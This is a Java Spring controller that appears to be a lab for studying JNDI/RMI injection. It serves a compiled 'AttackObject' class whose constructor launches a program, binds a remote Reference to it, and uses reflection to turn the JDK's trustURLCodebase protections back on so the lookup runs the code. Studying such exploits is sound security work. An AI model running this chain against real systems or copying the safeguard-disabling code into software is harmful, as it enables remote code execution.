package cn.moonlord.test;

import com.sun.jndi.rmi.registry.*;
import io.swagger.annotations.*;
import org.slf4j.*;
import org.springframework.web.bind.annotation.*;
import springfox.documentation.annotations.*;

import javax.naming.*;
import java.io.*;
import java.lang.reflect.*;
import java.rmi.*;
import java.rmi.registry.*;
import java.rmi.server.*;

@Api(tags = "JNDI 测试")
@RestController
@RequestMapping("/JNDI")
public class JNDITestController {

    private static final Logger logger = LoggerFactory.getLogger(JNDITestController.class);

    public interface Task extends Remote {
        public Object execute(Message message) throws RemoteException;
    }

    public static class Message implements Serializable {
        private String message;
        public Message(String message) {
            this.message = message;
        }
    }

    public static class RemoteTask /* extends UnicastRemoteObject*/ implements Task, Serializable {
        public RemoteTask() throws RemoteException {
            logger.info(String.valueOf(this));
        }
        @Override
        public Object execute(Message message) throws RemoteException {
            logger.info("RemoteTask.execute : " + message + " " + message.message);
            return message.message;
        }
    }

    public static class LocalTask /* extends UnicastRemoteObject*/ implements Task, Serializable {
        public LocalTask() throws RemoteException {
            logger.info(String.valueOf(this));
        }
        @Override
        public Object execute(Message message) throws RemoteException {
            logger.info("LocalTask.execute : " + message + " " + message.message);
            return message.message;
        }
    }

    private static void resetRmiTrustURLCodebase(Boolean trustURLCodebase) throws Exception {
        Field[] fields = RegistryContext.class.getDeclaredFields();
        for (Field field: fields) {
            if(field.getName().equals("trustURLCodebase")){
                field.setAccessible(true);
                Field modifiers = Field.class.getDeclaredField("modifiers");
                modifiers.setAccessible(true);
                modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                field.setBoolean(null, trustURLCodebase);
            }
        }
    }

    private static void resetLdapTrustURLCodebase(Boolean trustURLCodebase) throws Exception {
        Class VersionHelper12 = Class.forName("com.sun.naming.internal.VersionHelper12");
        Field[] fields = VersionHelper12.getDeclaredFields();
        for (Field field: fields) {
            if(field.getName().equals("trustURLCodebase")){
                field.setAccessible(true);
                Field modifiers = Field.class.getDeclaredField("modifiers");
                modifiers.setAccessible(true);
                modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                field.set(null, trustURLCodebase.toString());
            }
        }
    }

    private static final String AttackObject =
            "import java.io.Serializable;\n" +
            "public class AttackObject implements Serializable {\n" +
            "  public AttackObject() throws Exception {\n" +
            "    System.out.println(\"AttackObject 构造方法被调用！\");\n" +
            "    Runtime.getRuntime().exec(\"mspaint.exe\");\n" +
            "  }\n" +
            "}\n";

    @ApiIgnore
    @GetMapping(value = "AttackObject.class")
    public byte[] attackObject() throws Exception {
        String javaFile = "target/AttackObject.java";
        FileOutputStream out = new FileOutputStream(new File(javaFile));
        out.write(AttackObject.getBytes());
        out.close();
        Runtime.getRuntime().exec(new String[] { "javac", "-encoding", "UTF-8", javaFile });
        String classFile ="target/AttackObject.class";
        Thread.sleep(1000);
        FileInputStream in = new FileInputStream(new File(classFile));
        byte[] buffer = new byte[in.available()];
        in.read(buffer);
        in.close();
        logger.info("attackObject return size : " + buffer.length);
        return buffer;
    }

    @ApiOperation(value="测试用例 A1，启动 RMI 服务端")
    @GetMapping(value = "/TestA1")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "listenPort", example = "9000")})
    public String TestA1(@RequestParam Integer registryPort) throws Exception {
        RemoteTask remoteTask = new RemoteTask();
        UnicastRemoteObject.exportObject(remoteTask, 0);
        LocalTask localTask = new LocalTask();
        Reference attackObject = new Reference("AttackObject", "AttackObject", "http://127.0.0.1:8080/JNDI/");
        ReferenceWrapper attackObjectWrapper = new ReferenceWrapper(attackObject);
        Registry registry = LocateRegistry.createRegistry(registryPort);
        logger.info("registry : " + registry);
        registry.bind("remoteTask", remoteTask);
        registry.bind("localTask", localTask);
        Naming.bind("rmi://127.0.0.1:" + registryPort + "/naming/remoteTask", remoteTask);
        Naming.bind("rmi://127.0.0.1:" + registryPort + "/naming/localTask", localTask);
        Naming.bind("rmi://127.0.0.1:" + registryPort + "/naming/attackObject", attackObjectWrapper);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        return registry.toString();
    }

    @ApiOperation(value="测试用例 A2，启动 RMI 客户端，registry.lookup 调用远程方法，在服务器上执行")
    @GetMapping(value = "/TestA2")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
    public String TestA2(@RequestParam Integer registryPort) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
        logger.info("registry : " + registry);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        Task task = (Task) registry.lookup("remoteTask");
        logger.info("task : " + task);
        Message message = new Message("Hello World");
        logger.info("message : " + message + " " + message.message);
        return task.execute(message).toString();
    }

    @ApiOperation(value="测试用例 A3，启动 RMI 客户端，registry.lookup 调用远程方法，在本地执行")
    @GetMapping(value = "/TestA3")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
    public String TestA3(@RequestParam Integer registryPort) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
        logger.info("registry : " + registry);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        Task task = (Task) registry.lookup("localTask");
        logger.info("task : " + task);
        Message message = new Message("Hello World");
        logger.info("message : " + message + " " + message.message);
        return task.execute(message).toString();
    }

    @ApiOperation(value="测试用例 A4，启动 RMI 客户端，Naming.lookup 调用远程方法，在服务器上执行")
    @GetMapping(value = "/TestA4")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
    public String TestA4(@RequestParam Integer registryPort) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
        logger.info("registry : " + registry);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        Task task = (Task) Naming.lookup("rmi://127.0.0.1:" + registryPort + "/naming/remoteTask");
        logger.info("task : " + task);
        Message message = new Message("Hello World");
        logger.info("message : " + message + " " + message.message);
        return task.execute(message).toString();
    }

    @ApiOperation(value="测试用例 A5，启动 RMI 客户端，Naming.lookup 调用远程方法，在本地执行")
    @GetMapping(value = "/TestA5")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
    public String TestA5(@RequestParam Integer registryPort) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
        logger.info("registry : " + registry);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        Task task = (Task) Naming.lookup("rmi://127.0.0.1:" + registryPort + "/naming/localTask");
        logger.info("task : " + task);
        Message message = new Message("Hello World");
        logger.info("message : " + message + " " + message.message);
        return task.execute(message).toString();
    }

    @ApiOperation(value="测试用例 B1，启动 RMI 客户端，Context.lookup 获取远程 ReferenceWrapper 对象，新版本 JDK 会报错 The object factory is untrusted.")
    @GetMapping(value = "/TestB1")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
    public String TestB1(@RequestParam Integer registryPort) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
        logger.info("registry : " + registry);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
        Context ctx = new InitialContext();
        resetRmiTrustURLCodebase(false);
        resetLdapTrustURLCodebase(false);
        Object object = ctx.lookup("rmi://127.0.0.1:" + registryPort + "/naming/attackObject");
        return String.valueOf(object);
    }

    @ApiOperation(value="测试用例 B2，在 B1 的基础上，模拟旧版本，设置 com.sun.jndi.rmi.object.trustURLCodebase 为 true，无报错，但是对象不会构造")
    @GetMapping(value = "/TestB2")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
    public String TestB2(@RequestParam Integer registryPort) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
        logger.info("registry : " + registry);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
        Context ctx = new InitialContext();
        resetRmiTrustURLCodebase(true);
        resetLdapTrustURLCodebase(false);
        Object object = ctx.lookup("rmi://127.0.0.1:" + registryPort + "/naming/attackObject");
        return String.valueOf(object);
    }

    @ApiOperation(value="测试用例 B3，在 B2 的基础上，模拟旧版本，设置 com.sun.jndi.ldap.object.trustURLCodebase 为 true，对象成功构造（可以执行攻击代码）")
    @GetMapping(value = "/TestB3")
    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
    public String TestB3(@RequestParam Integer registryPort) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
        logger.info("registry : " + registry);
        for(String name : registry.list()){
            logger.info("registry name : " + name);
        }
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        Context ctx = new InitialContext();
        resetRmiTrustURLCodebase(true);
        resetLdapTrustURLCodebase(true);
        Object object = ctx.lookup("rmi://127.0.0.1:" + registryPort + "/naming/attackObject");
        return String.valueOf(object);
    }

}
